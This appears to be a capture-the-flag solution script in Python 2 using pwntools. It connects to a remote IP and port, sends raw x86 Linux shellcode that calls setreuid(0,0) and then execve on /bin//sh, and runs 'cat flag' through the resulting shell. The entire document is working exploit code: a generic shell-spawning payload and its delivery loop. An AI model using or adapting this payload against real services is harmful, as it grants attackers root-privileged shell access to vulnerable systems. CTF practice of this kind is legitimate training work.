from pwn import *


conn = remote('52.142.207.127', 5905)
context.log_level='error'

payload="\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"

print conn.recvline()

conn.sendline(payload)
conn.recvline()
conn.recvline()
conn.sendline("cat flag")
flag= conn.recvline()
print flag
